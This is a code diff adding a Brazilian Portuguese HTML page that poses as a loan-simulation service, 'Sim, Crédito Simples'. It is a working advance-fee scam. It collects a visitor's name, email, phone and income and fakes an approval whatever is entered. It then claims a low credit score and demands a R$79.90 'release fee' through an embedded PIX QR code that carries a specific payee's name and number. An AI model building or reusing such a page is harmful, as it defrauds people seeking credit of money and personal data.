@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulação de Crédito</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://via.placeholder.com/1920x1080') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 420px;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ff0055, #fb06ff);
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 2rem;
+        }
+
+        .logo {
+            width: 100px;
+            margin: 20px auto;
+        }
+
+        .form-container, .result-container, .qrcode-container {
+            padding: 20px;
+            display: none;
+        }
+
+        .form-container.active, .result-container.active, .qrcode-container.active {
+            display: block;
+        }
+
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            font-size: 0.9rem;
+            color: #191919;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            background-color: #f9f9f9;
+            box-sizing: border-box;
+            transition: box-shadow 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            box-shadow: 0 0 5px rgba(137, 207, 240, 0.8);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 8px;
+            background: linear-gradient(135deg, #ff0055, #fb06ff);
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #ff0055, #fb06ff);
+        }
+
+        .loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100px;
+        }
+
+        .loading span {
+            width: 15px;
+            height: 15px;
+            margin: 0 5px;
+            background: #00ff00;
+            border-radius: 50%;
+            animation: bounce 0.6s infinite alternate;
+        }
+
+        .loading.error span {
+            background: #ff0000;
+        }
+
+        .loading span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loading span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-20px); }
+        }
+
+        .footer {
+            text-align: center;
+            padding: 10px;
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+
+        .footer a {
+            color: #ff91d6;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer a:hover {
+            color: #ff74c9;
+        }
+
+        .qrcode {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="sim.4f43ac2f.webp" alt="Logo" class="logo">
+        </div>
+        <div class="form-container active" id="form-container">
+            <form id="credito-form">
+                <label for="nome">Nome Completo</label>
+                <input type="text" id="nome" name="nome" placeholder="Seu nome" required>
+
+                <label for="email">E-mail</label>
+                <input type="email" id="email" name="email" placeholder="Seu e-mail" required>
+
+                <label for="telefone">Telefone</label>
+                <input type="tel" id="telefone" name="telefone" placeholder="(XX) XXXXX-XXXX" required>
+
+                <label for="renda">Renda Mensal</label>
+                <input type="number" id="renda" name="renda" placeholder="Ex.: 2500" required>
+
+                <label for="limite">Quanto você precisa?</label>
+                <select id="limite" name="limite" required>
+                    <option value="">Selecione...</option>
+                    <option value="1000">R$1.000</option>
+                    <option value="2000">R$2.000</option>
+                    <option value="3000">R$3.000</option>
+                    <option value="5000">R$5.000</option>
+                </select>
+
+                <label for="parcelas">Número de Parcelas</label>
+                <select id="parcelas" name="parcelas" required>
+                    <option value="">Selecione...</option>
+                    <option value="12">12x</option>
+                    <option value="24">24x</option>
+                    <option value="36">36x</option>
+                    <option value="48">48x</option>
+                </select>
+
+                <button type="button" onclick="enviarFormulario()">Enviar</button>
+            </form>
+        </div>
+
+        <div class="loading" id="loading" style="display: none;">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+
+        <div class="result-container" id="result-container">
+            <h2>Parabéns, você foi aprovado!</h2>
+            <p>Digite sua chave PIX para receber os valores:</p>
+            <form id="pix-form">
+                <label for="pix">Chave PIX</label>
+                <input type="text" id="pix" name="pix" placeholder="Sua chave PIX" required>
+                <button type="button" onclick="receberValores()">Receber Valores</button>
+            </form>
+        </div>
+
+        <div class="loading" id="loading-qrcode" style="display: none;">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+
+        <div class="qrcode-container" id="qrcode-container">
+            <h2>Score muito baixo</h2>
+            <p>Por favor, pague a taxa de R$79,90 para a liberação imediata dos fundos!</p>
+            <div class="qrcode" id="qrcode"></div>
+            <button onclick="copiarChave()">Copiar Chave PIX</button>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 <a href="#"> Sim, Crédito Simples Todos os Direitos Reservados</a></p>
+        </div>
+    </div>
+
+    <script>
+        function enviarFormulario() {
+            document.getElementById('form-container').classList.remove('active');
+            document.getElementById('loading').style.display = 'flex';
+
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result-container').classList.add('active');
+            }, 3000);
+        }
+
+        function receberValores() {
+            document.getElementById('result-container').classList.remove('active');
+            document.getElementById('loading-qrcode').style.display = 'flex';
+
+            setTimeout(() => {
+                document.getElementById('loading-qrcode').classList.add('error');
+                const errorText = document.createElement('div');
+                errorText.className = 'error-text';
+                errorText.innerText = 'Problemas com score encontrados,.';
+                document.getElementById('loading-qrcode').appendChild(errorText);
+
+                setTimeout(() => {
+                    document.getElementById('loading-qrcode').style.display = 'none';
+                    document.getElementById('qrcode-container').classList.add('active');
+
+                    const qrCodeData = 'h00020126360014BR.GOV.BCB.PIX011451559024000116520400005303986540575.905802BR592551.559.024 GUILHERME GONC6009SAO PAULO62140510YLTIOaQlGV6304FC8E'; 
+                    QRCode.toCanvas(document.getElementById('qrcode'), qrCodeData, function (error) {
+                        if (error) console.error(error);
+                    });
+                }, 4000);
+
+            }, 5000);
+        }
+
+
+        function copiarChave() {
+            const chave = 'h00020126360014BR.GOV.BCB.PIX011451559024000116520400005303986540575.905802BR592551.559.024 GUILHERME GONC6009SAO PAULO62140510YLTIOaQlGV6304FC8E';
+            navigator.clipboard.writeText(chave).then(() => {
+                alert('Chave PIX copiada para a área de transferência!');
+            }).catch(() => {
+                alert('Erro ao copiar a chave PIX.');
+            });
+        }
+    </script>
+</body>
+</html>
